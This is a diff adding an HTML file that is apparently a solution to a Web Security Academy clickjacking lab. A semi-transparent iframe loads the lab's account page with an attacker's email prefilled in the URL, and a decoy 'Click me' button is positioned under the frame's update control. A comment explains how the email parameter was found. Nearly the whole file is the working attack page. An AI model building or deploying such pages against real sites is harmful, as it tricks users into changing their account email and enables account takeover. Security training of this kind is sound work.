@@ -1,0 +1,39 @@
+<!--
+    checking the source we see on update email endpoint
+    the email input field, 
+    testing the URL we come to know that 
+    https://LAB-ID.web-security-academy.net/my-account?email=hackertube@fastmail.com
+-->
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+        #target_website{
+            position: relative;
+            width: 800px;
+            height: 600px;
+            opacity: 0.5;
+            z-index: 2;
+        }
+        #decoy_website{
+            position:absolute;
+            width:300px;
+            height:400px;
+            z-index:1;
+            top: 450px;
+            left: 40px;
+            }
+        
+        </style>
+    </head>
+
+
+<body>    
+    <div id="decoy_website">
+        <button class="button" type="submit">Click me</button>
+    </div>
+
+    <iframe id="target_website" src="https://0a1900300383ccf881e5a989005f0090.web-security-academy.net/my-account?email=hackertube@fast.com"></iframe>
+</body>
+</html>
